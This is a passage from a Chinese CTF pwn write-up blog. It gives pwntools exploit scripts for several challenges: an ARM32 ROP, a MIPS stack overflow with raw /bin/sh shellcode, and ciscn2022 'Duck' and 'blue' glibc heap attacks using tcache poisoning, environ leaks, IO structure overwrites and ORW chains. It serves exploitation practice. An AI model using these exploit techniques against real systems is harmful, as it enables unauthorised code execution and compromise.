class="number">128</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">128</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = l64() - <span class="number">0x3c27b8</span></span><br><span class="line">inf(libc_base)</span><br><span class="line"><span class="comment"># og = one_gadget(libc_base)[0]</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">24</span>,<span class="string">b&#x27;/bin/sh;&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27; &#x27;</span>)+p64(system))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># =================================================</span></span><br><span class="line"><span class="comment"># pop_rdi = libc_base + 0x0000000000022b9a</span></span><br><span class="line"><span class="comment"># strbin = libc_base + libc.search(b&#x27;/bin/sh\x00&#x27;).__next__()</span></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27;*1032 + p64(libc_base + 0x3c27b0) + b&#x27;a&#x27;*8 + p64(pop_rdi) + p64(strbin) + p64(system)</span></span><br><span class="line"><span class="comment"># add(len(payload),payload)</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="0x0C-typo"><a href="#0x0C-typo" class="headerlink" title="0x0C typo"></a>0x0C typo</h2><p>arm32架构，补充一些arm基础知识</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">R0在常规操作中可用于存储临时值，也可以用于存储函数的第一个参数或返回结果</span><br><span class="line">在ARM架构中约定指定函数前四个参数存储在R0~R3寄存器中</span><br><span class="line">R7寄存器在函数调用中负责存储系统调用号</span><br><span class="line">R11寄存器即可以用来记录回溯信息,也可以当做局部变量来使用</span><br><span class="line">R13寄存器SP(堆栈指针)指向堆栈的顶部</span><br><span class="line">R14寄存器LR(链接寄存器)在进行函数调用时，LR寄存器内保存调用函数的下一条指令地址，用于被调用函数(子函数)结束工作后返回调用函数(父函数)</span><br><span class="line">R15寄存器PC(程序计数器)类似于X86架构下的EIP寄存器负责保存目标地址，与x86不同的点在于PC在ARM状态下存储当前指令+8的地址。</span><br><span class="line"></span><br><span class="line">其中R0 ~ R3是用来依次传递参数的，相当于x64下的rdi, rsi, rdx，R0还被用于存储函数的返回值，R7常用来存放系统调用号，R11是栈帧，相当于ebp，在arm中也被叫作FP，R13是栈顶，相当于esp，在arm中也被叫作SP，R14(LP)是用来存放函数的返回地址的，R15相当于eip，在arm中被叫作PC，但是在程序运行的过程中，PC存储着当前指令往后两条指令的位置，在arm架构中并不是像x86<span class="built_in">_</span>64那样用ret返回，而是直接pop &#123;PC&#125;。</span><br></pre></td></tr></table></figure>

<p><img src="https://files.catbox.moe/y1clyb.png" alt="d5b0775f7b7168d5ad8fa89244799b09"></p>
<p><img src="https://files.catbox.moe/78xpdh.png" alt="f1499bbf6081792ce4201b558ce0a532"></p>
<p>这里存在栈溢出，寻找gadget pop{r0,r4,pc}，有binsh和system，进行rop即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop_pc = <span class="number">0x00020904</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(pop_pc) + p32(<span class="number">0x0006C384</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x110B4</span>)</span><br><span class="line">sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<h2 id="0x0D-Add"><a href="#0x0D-Add" class="headerlink" title="0x0D Add"></a>0x0D Add</h2><p>学习<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">MIPS架构基础</a>，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  <span class="keyword">long</span> lVar2;</span><br><span class="line">  <span class="keyword">long</span> lVar3;</span><br><span class="line">  <span class="keyword">char</span> *pcVar4;</span><br><span class="line">  uint uVar5;</span><br><span class="line">  <span class="keyword">char</span> challenge [<span class="number">10</span>];</span><br><span class="line">  <span class="keyword">char</span> buf [<span class="number">64</span>];</span><br><span class="line">  </span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,(<span class="keyword">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[calc]&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Type \&#x27;help\&#x27; for  help.&quot;</span>);</span><br><span class="line">  srand(<span class="number">0x123456</span>);</span><br><span class="line">  iVar1 = rand();</span><br><span class="line">  <span class="built_in">sprintf</span>(challenge,<span class="string">&quot;%d&quot;</span>,iVar1);</span><br><span class="line">  uVar5 = <span class="number">0x80</span>;</span><br><span class="line">  pcVar4 = buf;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (uVar5 &lt; <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line">LAB_00400984:</span><br><span class="line">    iVar1 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 &lt; <span class="number">0</span>) <span class="keyword">goto</span> LAB_00400ad4;</span><br><span class="line">LAB_004009a4:</span><br><span class="line">    *pcVar4 = (<span class="keyword">char</span>)iVar1;</span><br><span class="line">    uVar5 = uVar5 - <span class="number">1</span>;</span><br><span class="line">    pcVar4 = pcVar4 + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> (iVar1 != <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> (uVar5 == <span class="number">0</span>) <span class="keyword">goto</span> LAB_004009c0;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    *pcVar4 = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">LAB_004009c0:</span><br><span class="line">    pcVar4 = <span class="built_in">strchr</span>(buf,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> (pcVar4 != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      *pcVar4 = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(buf,<span class="string">&quot;help&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      pcVar4 = <span class="string">&quot;Type \&#x27;exit\&#x27; to exit.&quot;</span>;</span><br><span class="line">LAB_00400b18:</span><br><span class="line">      <span class="built_in">puts</span>(pcVar4);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Input 2 numbers just like:&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(buf,<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Exiting...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(buf,challenge);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Your input was %p\n&quot;</span>,buf);</span><br><span class="line">        uVar5 = <span class="number">0x80</span>;</span><br><span class="line">        pcVar4 = buf;</span><br><span class="line">        <span class="keyword">goto</span> LAB_00400984;</span><br><span class="line">      &#125;</span><br><span class="line">      pcVar4 = <span class="built_in">strchr</span>(buf,<span class="number">0x20</span>);</span><br><span class="line">      <span class="keyword">if</span> (pcVar4 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        pcVar4 = <span class="string">&quot;Error!&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LAB_00400b18;</span><br><span class="line">      &#125;</span><br><span class="line">      lVar2 = strtol(buf,(<span class="keyword">char</span> **)<span class="number">0x0</span>,<span class="number">10</span>);</span><br><span class="line">      lVar3 = strtol(pcVar4 + <span class="number">1</span>,(<span class="keyword">char</span> **)<span class="number">0x0</span>,<span class="number">10</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d + %d = %d\n&quot;</span>,lVar2,lVar3,lVar3 + lVar2);</span><br><span class="line">      <span class="keyword">if</span> (lVar3 + lVar2 == <span class="number">0x133a05e</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Thanks,Bye~&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    uVar5 = <span class="number">0x80</span>;</span><br><span class="line">    iVar1 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">    pcVar4 = buf;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> &lt; iVar1) <span class="keyword">goto</span> LAB_004009a4;</span><br><span class="line">LAB_00400ad4:</span><br><span class="line">    <span class="keyword">if</span> (pcVar4 == buf) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>猜对随机数给buf的栈地址，随机种子是由srand(0x123456)生成的，即为固定值。</p>
<p>buf放的是输入内容，而程序接受输入的时候是遇到\n才停止，所以存在输入过长导致栈溢出的问题，通过溢出跳到shellcode即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">dll = CDLL(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">dll.srand(<span class="number">0x123456</span>)</span><br><span class="line">key = dll.rand()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;help.\n&quot;</span>, <span class="built_in">str</span>(key))</span><br><span class="line">ru(<span class="string">&quot;was 0x&quot;</span>)</span><br><span class="line">buf = <span class="built_in">int</span>(rl().strip(),<span class="number">16</span>)</span><br><span class="line">inf(buf)</span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(disasm(shellcode))</span></span><br><span class="line">payload = <span class="string">b&#x27;0&#x27;</span>*<span class="number">4</span> + shellcode.ljust(<span class="number">0x70</span> - <span class="number">4</span>, <span class="string">b&#x27;0&#x27;</span>) + p32(buf + <span class="number">4</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">&quot;exit&quot;</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="0x0E-ciscn2022-Duck"><a href="#0x0E-ciscn2022-Duck" class="headerlink" title="0x0E ciscn2022 Duck"></a>0x0E ciscn2022 Duck</h2><p>glibc2.34 没有hook函数，tcache存在异或加密机制，</p>
<p>题目存在UAF，可以对已经free的chunk进行show和edit，所以先泄露出libc_base和heap_base，之后就可以修改tcache的fd构造链</p>
<p>两种做法，一种是通过environ泄露栈地址，然后能够控制栈地址进行ROP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,con</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Idx&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;Content:&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Choice&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Idx&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Choice&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Idx&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):    </span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x0004060)&#x27;)</span></span><br><span class="line">libc_base = l64() - <span class="number">0x1f2cc0</span></span><br><span class="line">inf(libc_base)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base = u64(ru(<span class="string">b&quot;\nDone&quot;</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">inf(heap_base)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add()</span><br><span class="line">environ_addr=libc_base+libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x10</span>,p64((heap_base&gt;&gt;<span class="number">12</span>) ^ environ_addr) + p64(<span class="number">0</span>))</span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">show(<span class="number">15</span>)</span><br><span class="line">stack = l64() - <span class="number">0x168</span></span><br><span class="line">inf(stack)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">0x10</span>,p64((heap_base&gt;&gt;<span class="number">12</span>) ^ stack) + p64(<span class="number">0</span>))</span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">pop_rdi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)))</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">edit(<span class="number">17</span>,<span class="number">0x30</span>,payload)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x01688)&#x27;)</span></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p>第二种是利用puts时会调用_IO_new_file_overflow刷新缓冲区，所以利用uaf申请到_IO_file_jumps这里修改_IO_new_file_overflow为one_gadget即可getshell</p>
<p><img src="https://files.catbox.moe/ylkp5e.png" alt="image-20230510213118897"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):    </span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x0004060)&#x27;)</span></span><br><span class="line">libc_base = l64() - <span class="number">0x1f2cc0</span></span><br><span class="line">inf(libc_base)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base = u64(ru(<span class="string">b&quot;\nDone&quot;</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">inf(heap_base)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add()</span><br><span class="line"></span><br><span class="line">_IO_file_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">inf(_IO_file_jumps)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x10</span>,p64((heap_base&gt;&gt;<span class="number">12</span>) ^ _IO_file_jumps) + p64(<span class="number">0</span>))</span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">ogg = [<span class="number">0xda861</span>,<span class="number">0xda864</span>,<span class="number">0xda867</span>]</span><br><span class="line">og = libc_base + ogg[<span class="number">1</span>]</span><br><span class="line">gdb.attach(io)</span><br><span class="line">edit(<span class="number">15</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(og))</span><br></pre></td></tr></table></figure>

<p>另外有个题是禁用了system，那么在栈上构造orw读取flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">open_ = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_ = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_ = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment"># inf(open_);inf(read_);inf(write_)</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000028a55</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002a4cf</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x00000000000c7f32</span></span><br><span class="line">heap2 = heap_base + <span class="number">0x4c0</span></span><br><span class="line">heap3 = heap_base + <span class="number">0x5d0</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x8</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(pop_rdi) + p64(heap3) + p64(pop_rsi) + p64(<span class="number">0</span>) +p64(open_) \</span><br><span class="line"> + p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap2) +p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_) \</span><br><span class="line"> + p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write_)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">17</span>,<span class="number">0x100</span>,payload)</span><br></pre></td></tr></table></figure>

<h2 id="0x0F-ciscn2022-blue"><a href="#0x0F-ciscn2022-blue" class="headerlink" title="0x0F ciscn2022 blue"></a>0x0F ciscn2022 blue</h2><p>glibc-2.31，题目开了沙盒，提供一次show，一次uaf，最大申请0x90堆块，最多32个，free正常。通过泄露environ，在栈上写orw读取flag。</p>
<p>先填满tcache，再一个进unsortedbin1，利用uaf泄露libc基址。这里难点是，需要两块unsortedbin1，2合并为大块3，之后add出一个tcache，由于存在uaf，所以可以再一次free unsortedbin1（由于已经合并，所以可以绕过bins检查，存在double free），这样unsortedbin1就进入了tcache链尾，造成了overlap。</p>
<p><img src="https://files.catbox.moe/n1pxv1.png" alt="image-20230513195947928"></p>
<p>红色为大块3，里面是unsortedbin1，现在已经被链入tcache。由于show的次数用完，所以通过stdout进行泄露，之后修改unsortedbin1的fd为_IO_2_1_stdout_，将flags标志改掉（绕过检查），再将write_base和write_ptr &amp; write_end改成environ和environ + 8，泄露出environ的值。之后继续修改tcache链，申请到栈上构造rop即可。</p>
<p>(tcache要保证数量合法)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,con</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uaf</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;666&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">uaf(<span class="number">8</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc_base = l64() - <span class="number">0x1ecbe0</span></span><br><span class="line">inf(libc_base)</span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">stdout = libc_base + libc.sym[<span 